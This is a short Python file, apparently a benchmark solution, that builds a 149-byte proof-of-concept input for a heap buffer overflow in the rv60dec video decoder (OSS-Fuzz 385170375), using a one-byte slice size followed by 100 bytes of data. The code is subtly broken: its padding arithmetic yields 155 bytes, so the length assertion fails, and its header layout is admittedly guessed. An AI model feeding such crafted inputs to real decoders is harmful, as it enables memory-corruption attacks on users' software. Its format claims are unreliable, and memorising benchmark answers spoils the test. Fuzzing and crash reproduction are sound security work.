class Solution:
    def solve(self, src_path: str) -> bytes:
        # Minimal PoC for OSS-Fuzz 385170375: Heap buffer overflow in rv60dec slice gb initialization
        # This is a crafted input based on RV6 frame format with malformed slice size to cause over-read
        poc = (
            b'\x52\x56\x30\x30\x30\x30'  # RV00 identifier or similar for RV6
            b'\x00\x01\x00\x00'  # Frame header
            b'\x80'  # Subversion or type
            b'\x00\x00\x40\x00'  # Width/height hints
            b'\x01\x00\x00\x00'  # Flags
            b'\x00\x00\x00\x01'  # Timestamp
            b'\x00'  # Picture number
            b'\x01'  # Number of slices
            b'\x00\x00\x00\x32'  # Slice offset (50 bytes)
            b'\x00\x00\x00\x01'  # Slice size set to 1 byte (small allocation)
            b'\xff' * 100  # Slice data: 100 bytes to force read beyond 1-byte allocation
            b'\x00' * (149 - 4 - 4 - 1 - 4 - 4 - 1 - 1 - 4 - 4 - 100)  # Padding to 149 bytes
        )
        assert len(poc) == 149
        return poc
